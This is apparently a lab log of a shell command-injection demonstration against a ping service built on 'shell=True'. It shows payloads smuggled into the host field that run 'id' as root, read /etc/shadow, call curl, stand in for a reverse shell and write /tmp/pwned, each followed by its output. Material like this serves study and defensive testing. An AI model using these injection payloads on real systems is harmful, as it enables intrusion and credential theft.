@@ -1,0 +1,34 @@
+[2m-- pingsvc: subprocess.run(f"ping -c1 -W1 {host}", shell=True), no shield loaded
+[0m[1;33mtarget#[0m bash lab/exploit.sh
+== legitimate
+
+--- host=127.0.0.1
+ping: ok
+
+--- host=localhost
+ping: ok
+== injection
+
+--- host=127.0.0.1; id
+ping: ok
+uid=0(root) gid=0(root) groups=0(root)
+
+--- host=127.0.0.1; head -2 /etc/shadow
+ping: ok
+root::20765:0:99999:7:::
+daemon:*:20765:0:99999:7:::
+
+--- host=127.0.0.1; curl -s http://127.0.0.1:8080/?host=x >/dev/null && echo curl-ran
+ping: ok
+curl-ran
+
+--- host=127.0.0.1; bash -c 'echo reverse-shell-would-start-here'
+ping: ok
+reverse-shell-would-start-here
+
+--- host=127.0.0.1; echo builtin-write > /tmp/pwned; echo wrote /tmp/pwned
+ping: ok
+wrote /tmp/pwned
+
+== /tmp/pwned:
+builtin-write
